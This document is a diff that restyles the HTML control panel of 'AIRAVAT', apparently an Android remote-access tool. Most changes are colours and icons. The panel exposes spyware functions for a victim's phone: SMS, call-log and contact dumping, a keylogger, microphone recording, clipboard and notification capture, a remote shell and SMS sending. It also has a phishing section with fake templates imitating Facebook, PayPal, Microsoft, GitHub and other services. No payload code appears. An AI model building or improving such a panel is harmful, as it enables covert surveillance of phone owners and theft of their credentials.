@@ -2,6 +2,8 @@
 <!DOCTYPE html>
 <html>
 <head>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
 <title>AIRAVAT</title>
 <meta charset="UTF-8" />
 <link rel="icon" href="./img/logo.png"  >
@@ -48,10 +50,10 @@ src: local('eglantine'), url('./asset/eglantine.woff') format('woff');
 #users{
 height:100%;
 padding-bottom:15px;
-background:#000;
+background:#fff;
 width:100%;
 z-index:999999999;
-color:green;
+color:black;
 display:block;
 position:relative;
 }
@@ -59,9 +61,9 @@ position:relative;
 height:auto;
 width:90%;
 padding:10px;
-color:#0dd;
+color:#000;
 border-radius:5px;
-background:#001;
+background:#fff;
 border:1px solid #0dd;
 box-shadow:0px 0px 5px  black;
 margin:auto;
@@ -70,15 +72,15 @@ margin:auto;
 height:30px;
 width:150px;
 border:0;
-background:black;
+background:white;
 border-radius:5px;
-border:1px solid red;
-color:red;
+border:1px solid #16a34a;
+color:black;
 }
 #resp{
 padding-bottom:20px;
 width:100%;
-background:#000;
+background:#fff;
 position:absolute;
 top:0;
 color:#0dd;
@@ -164,8 +166,8 @@ list-style:none;
 }
 #fprev li:nth-child(5){
 text-align:center;
-background:#000;
-border:1px solid red;
+background:#fff;
+border:1px solid #16a34a;
 border-radius:5px;
 margin:auto;
 }
@@ -187,9 +189,6 @@ line-height:35px;
 #phones{
 width:100%;
 height:100%;
-background:url("./img/imgg.jpg");
-background-repeat:no-repeat;
-background-size:cover;
 position:absolute;
 top:0;
 left:0;
@@ -199,16 +198,22 @@ display:none;
 #phones .icon{
 height:50px;
 width:50px;
-background:url("./img/dump_messages.png");
-background-size:50px 50px;
-background-repeat:no-repeat;
 margin:20px;
 text-align:center;
 font-size:10px;
-color:white;
-line-height:120px;
+color:#282828;
+line-height:20px;
 
 }
+
+i.fas , i.fab {
+	display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 5px;
+}
+
 .dfle{
 width:100%;
 display:flex;
@@ -258,59 +263,32 @@ top:50px;
 height:calc(100% - 50px);
 width:100%;
 z-index:99;
-background:#000;
+background:#f5f6f7;
 overflow:auto;
 }
 #tophead{
-height:50px;
-width:100%;
-position:fixed;
-top:0;
-left:0;
-background: #000;
-background: linear-gradient(
-180deg ,
-rgba(0,0,0, 0),
-rgba(0,0,0, .9)
-),url(img/bg.png);
-background-size:cover;
-color:#fff;
-text-align:center;
+background: #fff;
+border-bottom: 1px solid #e5e7eb;
+text-align: center;
+padding: 2px 0;
+font-size: 10px;
+position: fixed;
+width: 100%;
+top: 0;
+z-index: 100;
+
 }
-#tophead .h4{
-background: linear-gradient(
-90deg,
-rgba(255, 0, 0, 1) 0%,
-rgba(255, 154, 0, 1) 10%,
-rgba(208, 222, 33, 1) 20%,
-rgba(79, 220, 74, 1) 30%,
-rgba(63, 218, 216, 1) 40%,
-rgba(47, 201, 226, 1) 50%,
-rgba(28, 127, 238, 1) 60%,
-rgba(95, 21, 242, 1) 70%,
-rgba(186, 12, 248, 1) 80%,
-rgba(251, 7, 217, 1) 90%,
-rgba(255, 0, 0, 1) 100%
-);
+h4.AIRAVAT{
 letter-spacing:10px;
 font-size:20px;
-color:transparent;
 position:relative;
 width:100%;
 height:100%;
-animation:anioo 2s linear infinite;
--webkit-background-clip:text;
 font-family:'eglantine';
-}
-@keyframes anioo{
-0%{
-background-position:0 0;
+color:#16a34a;
 }
 
-100%{
-background-position:700px 0;
-}
-}
+
 #barss{
 color:white;
 position:absolute;
@@ -318,50 +296,8 @@ top:0px;
 right:5px;
 font-size:40px;
 }
-.h4:before{
-content:'AIRAVAT';
-letter-spacing:8px;
-font-size:30px;
-color:transparent;
-background: linear-gradient(
-90deg,
-rgba(255, 0, 0, 1) 0%,
-rgba(255, 154, 0, 1) 10%,
-rgba(208, 222, 33, 1) 20%,
-rgba(79, 220, 74, 1) 30%,
-rgba(63, 218, 216, 1) 40%,
-rgba(47, 201, 226, 1) 50%,
-rgba(28, 127, 238, 1) 60%,
-rgba(95, 21, 242, 1) 70%,
-rgba(186, 12, 248, 1) 80%,
-rgba(251, 7, 217, 1) 90%,
-rgba(255, 0, 0, 1) 100%
-);
-animation:anioo2 2s linear infinite;
--webkit-background-clip:text;
-position:absolute;
-margin:auto;
-z-index:-1;
-top:0;
-left:0;
-width:100%;
-text-align:center;
-height:100%;
-}
-@keyframes anioo2{
-0%{
-filter:blur(30px);
-background-position:0 0;
-}
-50%{
-filter:blur(1px);
 
-}
-100%{
-filter:blur(30px);
-background-position:700px 0;
-}
-}
+
 #navbar{
 height:100%;
 width:70%;
@@ -443,14 +379,14 @@ border-bottom:3px solid #FFC72C;
 height:50px;
 width:150px;
 background: transparent;
-border:1px solid red;
+border:1px solid #16a34a;
 border-radius:5px;
 font-size:20px;
 color: #FFC72C;
 margin-top:10px;
 }
 input::placeholder{
-color:white;
+color:grey;
 }
 .hqh{
 background: transparent;
@@ -502,16 +438,18 @@ background:red;
 .dgh{
 position:absolute;
 top:30px;
-font-size:15px;
+font-size:10px;
 width:100%;
 text-align:center;
 }
 </style>
-<div id="tophead" >
-<h4 class="h4" >AIRAVAT</h4>
+<div id="tophead">
+
+<h4 class="AIRAVAT">AIRAVAT</h4>
 <div class="dgh" >&copy; Prateek Chaubey</div>
+
 <div id="backkk" onclick="backk(this)">
-<svg fill="#fff"  xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left" viewBox="0 0 16 16">
+<svg fill="#16a34a"  xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left" viewBox="0 0 16 16">
 <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
 </svg>
 </div>
@@ -532,39 +470,40 @@ text-align:center;
 <br>
 
 <div class="dfle"  style="" >
-<div class="icon" onclick="dumpsms()">Dump SMS</div>
-<div class="icon" onclick="calllogs()" style="background:url('./img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >CallLogs</div>
-<div class="icon" onclick="filesmanager()" style="background:url('./img/ic3.png');background-size:50px 50px;background-repeat:no-repeat;" >My Files</div>
-<div class="icon" onclick="getpackages()" style="background:url('./img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >AppsList</div>
+	<div class="icon" onclick="dumpsms()"><i class="fas fa-envelope fa-2x"></i>Messages</div>
+	<div class="icon" onclick="calllogs()"><i class="fas fa-phone fa-2x"></i>Call Log</div>
+	<div class="icon" onclick="filesmanager()"><i class="fas fa-file fa-2x"></i>Files</div>
+	<div class="icon" onclick="getpackages()"><i class="fab fa-android fa-2x"></i>App List</div>
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="deviceinfo()" style="background:url('./img/dump_device_info.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >SysInfo</div>
-<div class="icon" onclick="toastt()" style="background:url('./img/toast.png');background-size:50px 50px;background-repeat:no-repeat;" >Toast</div>
-<div class="icon" onclick="dumpcontact()" style="background:url('./img/dump_contacts.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Contacts</div>
-<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/itune.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1.07);" >PlayMusic</div>
+	<div class="icon" onclick="deviceinfo()"><i class="fas fa-info-circle fa-2x"></i>System Info</div>
+	<div class="icon" onclick="toastt()"><i class="fas fa-comment-dots fa-2x"></i>Toast</div>
+	<div class="icon" onclick="dumpcontact()"><i class="fas fa-address-book fa-2x"></i>Contacts</div>
+	<div class="icon" onclick="funcmd('fmc1')"><i class="fas fa-music fa-2x"></i>Play Sound</div>
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="sendmsg()" style="background:url('./img/send_message.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1);" >SendSMS</div>
-<div class="icon" onclick="startshell()" style="background:url('./img/shell_command.png');background-size:50px 50px;background-repeat:no-repeat;" >Shell</div>
-<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/img3.png');background-size:54px 54px;background-repeat:no-repeat;background-position:-2px -2px;">Vibrator</div>
-<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/img5.png');background-size:50px 50px;background-repeat:no-repeat;">TTS</div>
+	<div class="icon" onclick="sendmsg()" ><i class="fas fa-paper-plane fa-2x"></i>Send SMS</div>
+	<div class="icon" onclick="startshell()" ><i class="fas fa-terminal fa-2x"></i>Shell</div>
+	<div class="icon" onclick="funcmd('fmc1')"><i class="fas fa-mobile-alt fa-2x"></i>Vibrate</div>
+	<div class="icon" onclick="funcmd('fmc1')"><i class="fas fa-volume-up fa-2x"></i>TTS</div>
 
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">Keylogger</div>
-<div class="icon" onclick="changewallpaper()" style="background:url('./img/img1.png');background-size:50px 50px;background-repeat:no-repeat;transform:scale(1.25);">Wallpaper</div>
-<div class="icon" onclick="notificationlog()" style="background:url('./img/img2.png');background-size:50px 50px;background-repeat:no-repeat;">Notifications</div>
-<div class="icon" onclick="showphish()" style="background:url('./img/phish.png');background-size:50px 50px;background-repeat:no-repeat;">PhishData</div>
+<div class="icon" onclick="keylogger()"><i class="fas fa-keyboard fa-2x"></i>Keylogger</div>
+<div class="icon" onclick="notificationlog()"><i class="fas fa-bell fa-2x"></i>Notifications</div>
+<div class="icon" onclick="showphish()" ><i class="fas fa-user-secret fa-2x"></i>Phished Data</div>
+<div class="icon" onclick="showphpag()" ><i class="fas fa-exclamation-triangle fa-2x"></i>SE</div>
+
 </div>
-<div class="dfle"  style="" >
-<div class="icon" onclick="showphpag()" style="background:url('./img/scams.png');background-size:50px 50px;background-repeat:no-repeat;">Scams</div>
-<div class="icon" onclick="micrec()" style="background:url('./img/microphone_rec.png');background-size:50px 50px;background-repeat:no-repeat;">Recordings</div>
-<div class="icon" onclick="showclip()" style="background:url('./img/clip.png');background-size:50px 50px;background-repeat:no-repeat;">ClipBoard</div>
-<div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/img4.png');background-size:50px 50px;background-repeat:no-repeat;">Torch</div>
+
+<div class="dfle"  style="">
+<div class="icon" onclick="micrec()" ><i class="fas fa-microphone fa-2x"></i>Recordings</div>
+<div class="icon" onclick="showclip()"><i class="fas fa-clipboard fa-2x"></i>ClipBoard</div>
+<div class="icon" onclick="funcmd('fmc2')"><i class="fas fa-lightbulb fa-2x"></i>Torch</div>
+<div class="icon" onclick="funcmd('fmc2')"><i class="fas fa-globe fa-2x"></i>Goto URL</div>
+
 </div>
-<div class="dfle"  style="" >
-<div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div>
-</div>
+
 </div>
 
 
@@ -639,7 +578,7 @@ height:40px;
 width:150px;
 border:0;
 border-radius:5px;
-border:1px solid red;
+border:1px solid #16a34a;
 background:black;
 color:white;
 } 
@@ -655,20 +594,22 @@ overflow:auto;
 z-index:999;
 background:#111;
 }
+
 .keylogg {
 background:rgba(0,0,0,1);
 width:calc(95% - 20px);
 height:auto;
 margin:auto;
 padding:10px;
-color:#0dd;
+color:#f5f6f7;
 padding-bottom:10px;
 margin-top:8px;
 border-radius:10px;
 overflow:auto;
 }
+
 .keylogg  b{
-color:red;
+color:white;
 }
 .keylogg img{
 max-height:50px;
@@ -703,6 +644,7 @@ bottom:0;
 left:0;
 color:white;
 border:1px solid silver;
+padding:10px;
 }
 #shelldata{
 height:calc(100% - 50px);
@@ -757,7 +699,7 @@ color:white;
 
 
 <div id="pvtt" >
-<h3 style="color:red" >FUN COMMANDS</h3><br><br>
+<h3 style="color:#16a34a" >FUN COMMANDS</h3><br><br>
 <div id="fmc1" >
 <div id="plmc" >
 <h4>Play Music </h4><br>
@@ -796,7 +738,7 @@ color:white;
 
 
 <div id="senddm">
-<h4 style="color:#0fa">Send SMS</h4><br><br>
+<h4 style="color:black;padding-left:40px">Send SMS</h4><br><br>
 TO:<input type="text" id="smsnumber"  placeholder="Enter Mobile Number"  ><br><br>
 Message:<br><br><textarea id="smscontent"  placeholder="Enter Message Content" ></textarea>
 <br><br>
@@ -838,13 +780,15 @@ Message:<br><br><textarea id="smscontent"  placeholder="Enter Message Content" >
 <br>
 <h3>Phishing Commands</h3><br><br>
 <input type="text" id="nshpih"  placeholder="Enter Notification Title"  /><br>
-<br><hr>
+<br>
+<center>
 <select onchange="iojh()" id="lshpih" >
 <option value='0'>dropbox3.png</option><option value='1'>facebook2.png</option><option value='2'>facebook5.png</option><option value='3'>free_fire3.png</option><option value='4'>github1.png</option><option value='5'>instagram1.png</option><option value='6'>linkedin1.png</option><option value='7'>messenger1.png</option><option value='8'>microsoft1.png</option><option value='9'>netflix1.png</option><option value='10'>paypal2.png</option><option value='11'>protonmail1.png</option><option value='12'>pubg2.png</option><option value='13'>snapchat1.png</option><option value='14'>tumblir1.png</option><option value='15'>twitter1.png</option><option value='16'>wordpress1.png</option><option value='17'>yahoo1.png</option>
 
 </select>
 <img src="./imgg/dropbox3.png" id="hion"  style="max-height:60px;max-width:60px;" >
 <br><br>
+</center>
 <!--jjjwjjw-->
 <center>
 <select id="phpage" >
@@ -937,7 +881,7 @@ yahoo.html
 <button onclick="execphish()"> Execute</button>
 </center>
 <br>
-<hr>
+
 <br>
 <input type="text" id="shpih"  placeholder="Enter Your Link"  />
 <br><button class="btn"  onclick="execphish2()">Execute</button>
@@ -955,7 +899,7 @@ border-radius:5px;
 #showphishj button{
 height:30px;
 width:150px;
-background:#000;
+background:#fff;
 color:#0dd;
 border-radius:5px;
 margin-top:20px;
@@ -1004,7 +948,7 @@ height:50px;
 border: solid 1px #0dd;
 }
 #selectedimg{
-border:2px solid red;
+border:2px solid #16a34a;
 }
 .wallimg{
 display:flex;
@@ -1019,7 +963,7 @@ margin-left:10px;
 width:30%;
 }
 #pvtt h4{
-color:#0dd;
+color:black;
 }
 #pvtt input,#showphishj input,#senddm input,#micrec input[type="text"]{
 height:30px;
@@ -1027,10 +971,11 @@ padding:5px;
 width:80%;
 line-height:40px;
 border:0.5px solid #0dd;
-background:#001;
-color:#fff;
+background:#f5f6f7;
+color:#000;
 border-radius:5px;
 }
+
 #senddm{color:#fff}
 #senddm input{
 height:20px;
@@ -1039,12 +984,13 @@ margin-left:10px;
 #toastdiv,#pvtt,#showphishj,#micrec,#senddm,#wallpaperdiv{
 height:100%;
 width:100%;
-background:#000;
+background:#f5f6f7;
 position:absolute;
 top:0;
 left:0;
 display:none;
 z-index:99;
+padding:50px;
 }
 
 #pvtt button,#micrec .btn,#senddm button,#wallpaperdiv button{
@@ -1053,7 +999,7 @@ height:30px;
 width:110px;
 color:#fff;
 background:black;
-border:1px solid red;
+border:1px solid #16a34a;
 border-radius:5px;
 }
 /* use for test*/
@@ -1075,7 +1021,7 @@ width:110px;
 color:#fff;
 background:black;
 float:right;
-border:1px solid red;
+border:1px solid #16a34a;
 border-radius:5px;
 }
 .diachild{
@@ -1090,7 +1036,7 @@ width:calc(100% - 50px);
 #diamain{
 height:100%;
 width:100%;
-background:rgba(0,0,0,.9);
+background:white;
 position:absolute;
 top:0;
 display:none;
@@ -1099,9 +1045,9 @@ justify-content:center;
 left:0;
 z-index:99999999999999999;
 }
+
 #toastdiv h3,#micrec h3,#showphishj h3{
-color:#0dd;
-margin-left:30px;
+color:black;
 }
 
 #toastcmd,#senddm textarea{
@@ -1111,8 +1057,8 @@ padding-top:10px;
 padding-left:10px;
 width:80%;
 border:0.5px solid #0dd;
-background:#001;
-color:#fff;
+background:#f5f6f7;
+color:#000;
 border-radius:5px;
 }
 #toastdiv button{
@@ -1121,7 +1067,7 @@ height:30px;
 width:110px;
 color:#fff;
 background:black;
-border:1px solid red;
+border:1px solid #16a34a;
 border-radius:5px;
 }
 #cmdcernter {
